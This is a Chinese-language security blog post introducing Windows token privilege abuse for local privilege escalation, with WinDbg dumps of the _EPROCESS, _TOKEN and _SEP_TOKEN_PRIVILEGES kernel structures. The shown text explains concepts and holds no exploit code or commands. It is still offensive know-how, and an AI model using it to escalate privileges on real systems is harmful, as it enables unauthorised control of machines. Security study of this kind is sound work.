---
title: Revisiting a Token Privileges Abusing For Windows Local Privilege Escalation
date: 2022-03-29 11:26:00 +0800
author: WHOAMI
toc: true
categories: 域安全
tags: 域安全
layout: post
---

在过去几年中，Windows 内核利用变得越来越复杂，尤其是随着 Windows 10 的发布及其连续的核心更新。除了内核利用之外，还可以通过其他方式滥用令牌特权。在服务帐户遭到破坏且启用了非标准权限的情况下，通常可以利用它们来获得本地特权提升。

执行此操作的方法特定于每种特权。本文整合了不同的资源，为滥用令牌特权的方法提供了完整的参考。

[toc]

# # Token Overview

我们滥用令牌特权的基础源于 Windows 中对象访问控制模型的核心。Windows 使用令牌对象来描述特定线程或进程的安全上下文。这些由 `nt!_TOKEN` 结构表示的令牌对象包含大量安全和参考信息，包括完整性级别、特权、组等。我们的重点在于这些令牌中包含的特权部分。

## ## Windows Privilege Model

系统上的每个进程都在其 [`EPROCESS`](https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/eprocess) 结构中持有一个令牌对象引用，以便在对象访问协商或特权系统任务期间使用，如下所示。此令牌在登录过程中通过 LSASS 授予，因此会话中的所有进程最初都在同一令牌下运行。

```ruby
kd> dt _eprocess ffffa88e400d0080
ntdll!_EPROCESS
   +0x000 Pcb              : _KPROCESS
   // ...
   +0x358 ExceptionPortState : 0y000
   +0x360 Token            : _EX_FAST_REF
   +0x368 MmReserved       : 0
   +0x370 AddressCreationLock : _EX_PUSH_LOCK
   +0x378 PageTableCommitmentLock : _EX_PUSH_LOCK
   +0x380 RotateInProgress : (null) 
   +0x388 ForkInProgress   : (null) 
   // ...
```

一个进程持有一个主令牌，在进程中执行的线程继承这个相同的令牌。当线程需要使用一组不同的凭据访问对象时，它可以使用模拟令牌。使用模拟令牌不会影响主令牌或其他线程，只会在模拟线程的上下文中执行。这些模拟令牌可以通过内核提供的许多不同的 API 获得。

令牌用作进程访问票证，必须提交给 Windows 中的各种看门人，并在访问对象时通过 `SeAccessCheck()` 函数进行评估，在特权操作期间通过 `SeSinglePrivilegeCheck()` 函数进行评估。例如，当进程请求对文件的写访问权时，`SeAccessCheck()` 函数将评估令牌完整性级别，然后评估其自主访问控制列表（DACL）。 当进程试图通过 `NtShutdownSystem()` 关闭系统时，内核将评估请求进程令牌是否启用了 `SeShutdownPrivilege` 特权。

## ## Token Structure and Privileges

如前所述，`_TOKEN` 结构主要包含有关进程或线程的安全上下文信息，如下所示：

```ruby
kd> dt _TOKEN ffff838b73a1a6b0
nt!_TOKEN
   +0x000 TokenSource      : _TOKEN_SOURCE
   +0x010 TokenId          : _LUID
   +0x018 AuthenticationId : _LUID
   +0x020 ParentTokenId    : _LUID
   +0x028 ExpirationTime   : _LARGE_INTEGER 0x7fffffff`ffffffff
   +0x030 TokenLock        : 0xffffa88e`3fccb590 _ERESOURCE
   +0x038 ModifiedId       : _LUID
   +0x040 Privileges       : _SEP_TOKEN_PRIVILEGES
   +0x058 AuditPolicy      : _SEP_AUDIT_POLICY
   +0x078 SessionId        : 1
   +0x07c UserAndGroupCount : 0x13
   +0x080 RestrictedSidCount : 0
   +0x084 VariableLength   : 0x2a4
   +0x088 DynamicCharged   : 0x1000
   +0x08c DynamicAvailable : 0
   +0x090 DefaultOwnerIndex : 4
   +0x098 UserAndGroups    : 0xffff838b`73a1ab40 _SID_AND_ATTRIBUTES
   +0x0a0 RestrictedSids   : (null) 
   +0x0a8 PrimaryGroup     : 0xffff838b`740c1b10 Void
   +0x0b0 DynamicPart      : 0xffff838b`740c1b10  -> 0x501
   +0x0b8 DefaultDacl      : 0xffff838b`740c1b2c _ACL
   +0x0c0 TokenType        : 1 ( TokenPrimary )
   +0x0c4 ImpersonationLevel : 0 ( SecurityAnonymous )
   +0x0c8 TokenFlags       : 0x2000
   +0x0cc TokenInUse       : 0x1 ''
   +0x0d0 IntegrityLevelIndex : 0x12
   +0x0d4 MandatoryPolicy  : 3
   +0x0d8 LogonSession     : 0xffff838b`720fc840 _SEP_LOGON_SESSION_REFERENCES
   +0x0e0 OriginatingLogonSession : _LUID
   +0x0e8 SidHash          : _SID_AND_ATTRIBUTES_HASH
   +0x1f8 RestrictedSidHash : _SID_AND_ATTRIBUTES_HASH
   +0x308 pSecurityAttributes : 0xffff838b`7163e6d0 _AUTHZBASEP_SECURITY_ATTRIBUTES_INFORMATION
   +0x310 Package          : (null) 
   +0x318 Capabilities     : (null) 
   +0x320 CapabilityCount  : 0
   +0x328 CapabilitiesHash : _SID_AND_ATTRIBUTES_HASH
   +0x438 LowboxNumberEntry : (null) 
   +0x440 LowboxHandlesEntry : (null) 
   +0x448 pClaimAttributes : (null) 
   +0x450 TrustLevelSid    : (null) 
   +0x458 TrustLinkedToken : (null) 
   +0x460 IntegrityLevelSidValue : (null) 
   +0x468 TokenSidValues   : (null) 
   +0x470 IndexEntry       : 0xffff838b`7281a370 _SEP_LUID_TO_INDEX_MAP_ENTRY
   +0x478 DiagnosticInfo   : (null) 
   +0x480 BnoIsolationHandlesEntry : (null) 
   +0x488 SessionObject    : 0xffffa88e`3a33e180 Void
   +0x490 VariablePart     : 0xffff838b`73a1ac70
```

我们关注的重点是该结构中的 `_SEP_TOKEN_PRIVILEGES` 条目，位于 0x40 偏移量处，包含令牌特权信息：

```ruby
kd> dt nt!_SEP_TOKEN_PRIVILEGES ffff838b73a1a6b0+0x40
   +0x000 Present          : 0x0000001e`73deff20
   +0x008 Enabled          : 0x60800000
   +0x010 EnabledByDefault : 0x60800000
```

